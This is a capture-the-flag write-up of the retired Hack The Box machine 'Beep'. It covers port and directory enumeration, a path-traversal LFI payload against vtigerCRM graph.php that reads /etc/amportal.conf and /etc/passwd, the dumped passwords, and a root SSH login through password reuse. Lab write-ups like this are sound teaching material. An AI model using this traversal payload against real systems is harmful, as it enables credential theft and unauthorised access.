---
layout: writeup
name: "Beep"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/beep/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---

# 🧪 Machine Name: `Beep`

**Platform:** Hack The Box  
**IP Address:** `10.10.10.7`  
**Difficulty:** Easy Linux  

---

## 🧭 Overview

Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- 10.10.10.7 --min-rate 10000
```

```bash
nmap 10.10.10.7 -sCV -oN nmapscan
```

- Many ports open, including **80/443** (web), **3306** (MySQL), **10000** (Webmin), and **5038** (Asterisk).
- Port 443 shows an Elastix login page.

---

## 🕵️ Web Enumeration

- Browsing `http://10.10.10.7` initially failed → forced TLS 1.0 allowed the page to load (Elastix login).
- Ran **dirsearch** to enumerate directories:

```bash
dirsearch -u http://beep.htb
```

- Interesting hit: `/mailman/listinfo` → exposed Mailman group mismatch.

---

## 🎯 Foothold

### LFI Exploit

Found public exploit: [https://www.exploit-db.com/exploits/37637](https://www.exploit-db.com/exploits/37637) → **LFI via vtigerCRM graph.php**

Tested:

```bash
https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

✅ Dumped `/etc/amportal.conf` → **DB creds + manager creds**:

```text
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

Then verified wider LFI:

```bash
https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

✅ Dumped `/etc/passwd` → confirmed users:

- `asterisk`
- `fanis`
- `root`

---

## 🚀 Privilege Escalation

- Tried credential reuse over SSH:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 root@beep.htb
```

✅ Root password was reused: `jEhdIekWmdjE`

```bash
[root@beep ~]# cat root.txt
083a385faea1a955f2550020bfd4ccc0
```

User flag:

```bash
[root@beep ~]# cat /home/fanis/user.txt
3196a67aeb4ad47494efdff2a8fe1aed
```

---

## 🧠 Lessons Learned

- Old HTB boxes may require **legacy SSH algorithms** (important to remember this command):

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 user@target
```

- LFI → config file → credential reuse is a common and effective path.
- Beep has many distracting services — stay focused on high-value targets (Web → LFI → root).

---

*Writeup by inksec*  
GitHub: [https://github.com/inkedqt](https://github.com/inkedqt)

---

### Featured Writeups Snippet

```markdown
- Beep: Nmap → LFI in vtigerCRM → /etc/amportal.conf loot → SSH legacy algorithms → Root via re-used password
```

